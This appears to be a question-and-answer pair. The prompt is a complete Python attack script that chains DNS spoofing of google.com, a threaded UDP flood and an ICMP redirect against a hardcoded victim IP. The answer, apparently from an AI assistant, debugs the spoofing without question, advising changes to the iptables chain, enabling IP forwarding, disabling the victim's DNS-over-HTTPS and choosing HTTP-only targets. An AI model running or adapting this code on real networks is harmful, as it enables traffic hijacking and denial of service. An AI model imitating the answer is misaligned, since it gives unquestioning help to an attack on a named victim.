@@ -1,0 +1,247 @@
+Prompt: 
+
+from scapy.all import *
+from netfilterqueue import NetfilterQueue
+import os
+import random
+import socket
+import threading
+import time
+from http.server import SimpleHTTPRequestHandler, HTTPServer
+
+# Define global variables to keep track of attack state and victim's details
+victim_ip = "192.168.86.132"
+victim_mac = ""
+dns_attack_successful = False
+udp_attack_successful = False
+
+# DNS mapping records to spoof (e.g., google.com redirected to hacked.com)
+dns_hosts = {
+    b"www.google.com.": "192.168.86.130",  # Replace with hacked.com IP
+    b"google.com.": "192.168.86.130"       # Replace with hacked.com IP
+}
+
+# Function to sniff victim's IP and MAC address (initial reconnaissance)
+def sniff_victim_info(interface="eth0", victim_ip="192.168.86.132"):
+    print(f"[*] Sniffing for packets from {victim_ip}...")
+    # Create a BPF filter to only capture packets from the target IP
+    bpf_filter = f"src host {victim_ip}"
+    packets = sniff(iface=interface, filter=bpf_filter, count=10)  # Capture packets matching the filter
+    for pkt in packets:
+        if pkt.haslayer(Ether) and pkt.haslayer(IP):
+            global victim_mac
+            victim_mac = pkt[Ether].src
+            print(f"[+] Victim found! IP: {victim_ip}, MAC: {victim_mac}")
+            break
+
+# DNS Spoofing component
+def process_packet(packet):
+    """
+    Callback for processing packets redirected to the netfilter queue.
+    Modifies DNS packets to spoof IP addresses.
+    """
+    global dns_attack_successful
+    scapy_packet = IP(packet.get_payload())
+    if scapy_packet.haslayer(DNSRR):
+        print("[Before]:", scapy_packet.summary())
+        try:
+            scapy_packet = modify_packet(scapy_packet)
+        except IndexError:
+            pass
+        print("[After ]:", scapy_packet.summary())
+        packet.set_payload(bytes(scapy_packet))
+    packet.accept()
+
+def modify_packet(packet):
+    """
+    Modifies the DNS Resource Record packet to map the dns_hosts dictionary.
+    """
+    qname = packet[DNSQR].qname
+    if qname not in dns_hosts:
+        print("No modification:", qname)
+        return packet
+    packet[DNS].an = DNSRR(rrname=qname, rdata=dns_hosts[qname])
+    packet[DNS].ancount = 1
+    del packet[IP].len
+    del packet[IP].chksum
+    del packet[UDP].len
+    del packet[UDP].chksum
+    return packet
+
+# Start a basic HTTP server to log requests from the victim
+def start_http_server(server_ip, server_port=80):
+    class LoggingRequestHandler(SimpleHTTPRequestHandler):
+        def do_GET(self):
+            global dns_attack_successful
+            client_ip = self.client_address[0]
+            if client_ip == victim_ip:
+                print(f"[+] Victim {victim_ip} accessed the spoofed site! DNS Spoofing successful.")
+                dns_attack_successful = True
+            self.send_response(200)
+            self.end_headers()
+            self.wfile.write(b"<html><body><h1>Welcome to hacked.com</h1></body></html>")
+
+    httpd = HTTPServer((server_ip, server_port), LoggingRequestHandler)
+    print(f"[*] HTTP server started on {server_ip}:{server_port}")
+    httpd.serve_forever()
+
+# UDP Flooding component
+def udp_flood(ip, port):
+    data = random._urandom(1024)  # Create a large packet for flooding
+    while True:
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            addr = (str(ip), int(port))
+            s.sendto(data, addr)  # Send to victim's IP
+            s.close()
+        except:
+            print(f"[*] UDP Flood failed on port {port}")
+            break
+
+def start_udp_flood():
+    global udp_attack_successful
+    print("[*] Initiating UDP Flooding...")
+    # Start two threads, one for HTTP (80) and one for HTTPS (443)
+    t1 = threading.Thread(target=udp_flood, args=(victim_ip, 80))
+    t2 = threading.Thread(target=udp_flood, args=(victim_ip, 443))
+    t1.start()
+    t2.start()
+    t1.join()
+    t2.join()
+    # Check success by verifying if HTTP/HTTPS is still reachable
+    time.sleep(5)
+    if not check_http_reachability(victim_ip):
+        udp_attack_successful = True
+
+def check_http_reachability(ip):
+    """Check if HTTP/HTTPS is reachable on the victim IP"""
+    try:
+        socket.create_connection((ip, 80), timeout=2)
+        return True
+    except:
+        return False
+
+# ICMP Redirect attack component
+def send_icmp_redirect(gateway_ip, attacker_ip):
+    print("[*] Sending ICMP Redirect to victim...")
+    # Construct the ICMP Redirect packet
+    ip_layer = IP(src=gateway_ip, dst=victim_ip)
+    icmp_layer = ICMP(type=5, code=1, gw=attacker_ip)
+    original_ip = IP(src=victim_ip, dst="8.8.8.8") / ICMP()
+    send(ip_layer / icmp_layer / original_ip, verbose=False)
+    print(f"[+] ICMP Redirect sent to {victim_ip} -> {attacker_ip}")
+
+# Main function to manage the entire attack sequence
+if __name__ == "__main__":
+    # Step 1: Sniff victim IP and MAC address
+    sniff_victim_info(target_ip="192.168.86.132")  # Specify the target IP
+
+    # Step 2: Start a separate thread for the HTTP server to confirm DNS spoofing
+    spoofed_ip = "192.168.86.130"  # Replace with the actual spoofed IP
+    server_thread = threading.Thread(target=start_http_server, args=(spoofed_ip,))
+    server_thread.start()
+
+    # Step 3: Setup NetfilterQueue for DNS Spoofing
+    QUEUE_NUM = 0
+    os.system("iptables -I FORWARD -j NFQUEUE --queue-num {}".format(QUEUE_NUM))
+
+    # Step 4: Start DNS Spoofing
+    queue = NetfilterQueue()
+    try:
+        print("[*] Starting DNS Spoofing...")
+        queue.bind(QUEUE_NUM, process_packet)
+        queue.run()
+    except KeyboardInterrupt:
+        os.system("iptables --flush")
+        print("[!] DNS Spoofing terminated.")
+
+    # Step 5: If DNS Spoofing fails, initiate UDP Flooding
+    if not dns_attack_successful:
+        print("[!] DNS Spoofing failed. Moving to UDP Flooding...")
+        start_udp_flood()
+
+    # Step 6: If UDP Flooding also fails, launch ICMP Redirect attack
+    if not udp_attack_successful:
+        print("[!] UDP Flooding failed. Sending ICMP Redirect...")
+        gateway_ip = "192.168.86.2"  # Real gateway IP
+        attacker_ip = "192.168.86.130"  # Attacker IP (this machine)
+        send_icmp_redirect(gateway_ip, attacker_ip)
+
+When I run this code, the attacker gets the MAC address successfully, and starts DNS spoofing, but if the victim opens google.com, the spoofed message does not appear and google opens normally. what should I do??
+
+
+Answer:
+
+The issue could be related to how DNS spoofing is applied, and it may be due to one or more of the following reasons:
+
+1. **Netfilter Queue Setup**:
+   Make sure that the Netfilter Queue is set up correctly on the attacking machine to intercept packets. If there are any misconfigurations, it will prevent DNS packets from being redirected for spoofing. To verify, try these steps:
+
+   - Check the iptables rule with the command:
+     ```bash
+     sudo iptables -L -v
+     ```
+     Ensure that packets are being redirected to the correct queue number (`QUEUE_NUM = 0`).
+
+2. **iptables Rule Might Be Incorrect**:
+   Your iptables rule is using `FORWARD` chain, which is for packets routed through your machine. If your attacker machine is directly between the victim and the gateway, this will work. Otherwise, if your attacker is the gateway or in the same subnet, change `FORWARD` to `OUTPUT` or `INPUT`:
+
+   ```bash
+   sudo iptables -I INPUT -j NFQUEUE --queue-num 0
+   ```
+   Try different chains based on the attacker and victim network configuration.
+
+3. **Correct DNS Hostname Matching**:
+   DNS spoofing in the code uses hardcoded domain names (`www.google.com.` and `google.com.`) with a trailing dot. Make sure that the `qname` in the DNS packet matches exactly. Sometimes the request may be for `www.google.com` or even a subdomain like `mail.google.com`. To handle multiple variations, update the `dns_hosts` dictionary with possible subdomains.
+
+4. **Check DNS Caching**:
+   The victim machine might have cached the real IP address of `google.com` before your attack started, making the spoof ineffective. To verify, try:
+
+   - Flushing the DNS cache on the victim machine:
+     ```bash
+     ipconfig /flushdns
+     ```
+   - Or, use a private browsing session, which usually bypasses the local cache.
+
+5. **Firewall or Antivirus Blocking**:
+   If the victim is running an antivirus or firewall, it might detect the DNS spoofing attempt and block it. Make sure the security settings are not interfering.
+
+6. **Check the HTTP Server**:
+   Ensure that the HTTP server on the attacker machine is reachable and running at the spoofed IP address (`192.168.86.130`). Try opening `http://192.168.86.130` from the victim manually to confirm the web server is accessible.
+
+7. **HTTPS Redirection**:
+   Many modern websites (including Google) use HTTPS (port 443) instead of HTTP (port 80) and implement HSTS (HTTP Strict Transport Security), which means that the browser will forcefully redirect HTTP to HTTPS. In such cases, your spoofed HTTP page won’t appear. To test this:
+
+   - Try spoofing a different site that only uses HTTP (e.g., a test domain or a less secure site).
+
+8. **Check the Packet Redirection**:
+   Add debugging prints inside the `process_packet()` function to see if packets are indeed being intercepted and processed. Add a line like:
+
+   ```python
+   print(f"[DEBUG] Intercepted packet: {scapy_packet[DNSQR].qname}")
+   ```
+   This will help confirm that the DNS request is correctly being captured.
+
+9. **Modify Firewall Rules for Response Packets**:
+   If the victim machine is not receiving the spoofed DNS response, try adding rules to ensure packets are sent back correctly. For example:
+
+   ```bash
+   sudo sysctl -w net.ipv4.ip_forward=1
+   ```
+
+10. **Check Browser Behavior**:
+    Modern browsers sometimes send DNS requests over DoH (DNS over HTTPS), which bypasses local DNS servers entirely. You can disable DoH in your victim browser settings, or test using command-line tools like `nslookup` or `dig` from the victim to see if the DNS spoof works.
+
+### Suggested Debugging Steps
+1. Manually test DNS spoofing with `dig`:
+   - On the victim, open a terminal and run:
+     ```bash
+     nslookup www.google.com
+     ```
+   - This will show if the DNS response is being spoofed correctly.
+
+2. Print additional debugging information:
+   - Add debugging prints in your `process_packet()` function to verify that packets are modified and returned correctly.
+
+By checking these configurations, you should be able to identify where the issue lies. Let me know if any of these suggestions help!
+
